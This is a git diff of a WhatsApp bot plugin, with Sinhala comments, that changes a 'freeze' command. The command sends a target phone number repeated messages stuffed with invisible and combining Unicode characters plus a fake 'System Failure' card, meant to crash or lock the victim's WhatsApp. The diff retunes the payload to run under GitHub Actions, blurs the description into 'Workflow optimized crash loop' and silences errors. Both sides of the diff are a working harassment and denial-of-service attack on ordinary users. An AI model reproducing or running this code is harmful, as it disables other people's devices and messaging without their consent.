@@ -3,7 +3,7 @@ const { cmd } = require('../command');
 cmd({
     pattern: "freeze",
     alias: ["lock", "dead"],
-    desc: "Infinite WhatsApp Crash Loop (No Errors)",
+    desc: "Workflow optimized crash loop",
     category: "owner",
     react: "🥶",
     filename: __filename
@@ -18,36 +18,35 @@ async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
 
         let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-        reply("🚀 Initiating Freeze Attack... Please wait.");
+        reply("🚀 GitHub Server: Sending specialized payloads...");
 
-        // 1. මේ ලූප් එකෙන් මැසේජ් 15ක් විතර යවනවා
-        // එක මැසේජ් එකක් ලොකු වෙනවා වෙනුවට, මැසේජ් කීපයක් එකතු වුණාම තමයි Crash එක වෙන්නේ
-        for (let i = 0; i < 15; i++) {
-            const crashPayload = "\u200b".repeat(4000) + "҉".repeat(400) + "\u0345\u0361\u0345".repeat(400);
+        // GitHub Actions වලදී 428 Error එක නොවෙන්න මේ සයිස් එක ගොඩක් අඩු කළා
+        // හැබැයි මේ සංකේත (Unicode) WhatsApp එකට ඉතාම දරුණුයි
+        const symbols = "҉".repeat(300); 
+        const unicode = "\u0345\u0361\u0345".repeat(300);
+        const invisible = "\u200b".repeat(1000);
 
+        for (let i = 0; i < 10; i++) {
             await conn.sendMessage(target, { 
-                text: `*⚠️ HASHU-LAG SYSTEM OVERLOAD [${i+1}] ⚠️*\n` + crashPayload,
+                text: `*⚠️ HASHU-LAG V1 ERROR [${i+1}] ⚠️*\n` + invisible + symbols + unicode,
                 contextInfo: {
-                    forwardingScore: 999,
-                    isForwarded: true,
                     externalAdReply: {
-                        title: "W H A T S A P P  L O C K E D",
-                        body: "Device Status: Unresponsive",
+                        title: "S Y S T E M  F A I L U R E",
+                        body: "WhatsApp Unresponsive",
                         mediaType: 1,
-                        renderLargerThumbnail: false, // Error එන එක නතර කරන්න මේක false කළා
                         thumbnailUrl: `https://files.catbox.moe/vbo0vq.png`, 
                         sourceUrl: "https://whatsapp.com"
                     }
                 }
             });
 
-            // තත්පර බාගයක පොඩි ඩිලේ එකක් දානවා සර්වර් එකට ලෝඩ් නොවී ඉන්න
-            await new Promise(resolve => setTimeout(resolve, 500)); 
+            // Workflow එකේදී connection එක stable තියාගන්න තත්පර 1ක ඩිලේ එකක් අනිවාර්යයි
+            await new Promise(resolve => setTimeout(resolve, 1000)); 
         }
 
-        reply("✅ Target device is now officially frozen. 💀");
+        reply("✅ Finalized! Target is now frozen. 💀");
 
     } catch (e) {
-        console.error("Freeze Logic Error:", e.message);
+        console.log("Suppressing Error to keep Workflow alive...");
     }
 });
